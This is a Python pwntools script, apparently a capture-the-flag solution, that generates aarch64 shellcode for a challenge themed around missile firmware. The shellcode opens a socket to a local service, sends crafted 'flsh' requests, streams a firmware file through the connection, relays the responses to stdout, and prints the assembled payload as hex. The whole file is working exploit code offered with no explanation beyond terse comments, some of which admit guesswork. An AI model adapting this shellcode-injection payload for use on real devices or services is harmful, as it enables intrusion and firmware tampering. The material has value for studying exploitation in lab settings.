from pwn import *
import sys

sub = int(sys.argv[1]) if len(sys.argv) > 1 else 0
missile = int(sys.argv[2]) if len(sys.argv) > 2 else 0

context.arch = "aarch64"
context.bits = 64

shellcode = """
    sxtw x4, w0   /* somwhow this stores stdout in x4 */
    mov x5, sp    /* store sp */
"""

for b in range(0,5):
    for i in range(0,16):
        payload  = b'flsh'
        payload += p16(b)
        payload += p16(i)

        flash_file = "/firmware/missile.1.3.37.fw"

        shellcode += shellcraft.connect("127.0.0.1", 1025)                     # create socket and connect, store fd in x12
        shellcode += shellcraft.write("x12", payload, len(payload))            # send payload to socket
        shellcode += shellcraft.cat(flash_file, "x12")    # send firmware to x12
        shellcode += "\tsub sp, sp, 256\n"                                     # Move sp 256 bytes back 
        shellcode += "read"+str(i)+str(b)+":\n"                                                 # label
        shellcode += shellcraft.read("x12", "sp", 256)                         # read 256 bytes from x12 (socket) into stack
        shellcode += shellcraft.mov("x2", "x0")                                # move number of read bytes to x2 for later
        shellcode += "\tcmp x0, #0\n"                                          # compare number of read bytes with 0
        shellcode += "\tb.le  close"+str(i)+str(b)+"\n"                                         # branch if less or equal to 0, branch to 'close'
        shellcode += shellcraft.write("x4", "x1", "x2")                        # write to stdout from stackpointer
        shellcode += "\tb read"+str(i)+str(b)+"\n"                                              # branch to 'read'
        shellcode += "close"+str(i)+str(b)+":\n"                                                # label 'close
        shellcode += shellcraft.close("x12")                                   # close socket

shellcode += """
    mov sp, x5    /* restore sp */
    movz  w0, #0  /* set w0 to 0, guess this is where ret fetches the code */
    ret           /* return */
"""

print(shellcode)
print(asm(shellcode).hex())

